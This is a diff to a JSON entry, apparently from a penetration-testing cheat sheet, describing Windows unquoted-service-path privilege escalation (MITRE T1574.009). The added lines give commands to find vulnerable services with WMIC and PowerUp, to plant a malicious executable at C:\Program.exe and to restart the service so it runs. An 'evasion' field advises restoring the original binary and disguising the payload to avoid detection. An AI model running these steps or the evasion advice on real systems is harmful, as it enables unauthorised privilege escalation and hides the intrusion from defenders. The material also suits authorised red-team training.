@@ -84,6 +84,31 @@
     "sources": [
       "HTB M26",
       "MITRE T1574.009"
-    ]
-  }
+    ],
+    "evasion": "Restore the original service binary/ACL/registry value after execution; trigger via a scheduled restart instead of an obvious sc stop/start; name the payload to blend with the legitimate service."
+  },
+  "variations": [
+    {
+      "label": "Find unquoted paths (WMIC)",
+      "command": "wmic service get name,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v '\\\"'"
+    },
+    {
+      "label": "PowerUp",
+      "command": "Get-ServiceUnquoted -Verbose"
+    }
+  ],
+  "steps": [
+    {
+      "label": "Find an unquoted service path with a writable dir",
+      "command": "Get-ServiceUnquoted -Verbose"
+    },
+    {
+      "label": "Drop a malicious exe in the earlier path segment",
+      "command": "copy evil.exe 'C:\\Program.exe'   # if C:\\Program Files\\... is unquoted"
+    },
+    {
+      "label": "Restart the service to trigger it",
+      "command": "sc stop <service> & sc start <service>"
+    }
+  ]
 }
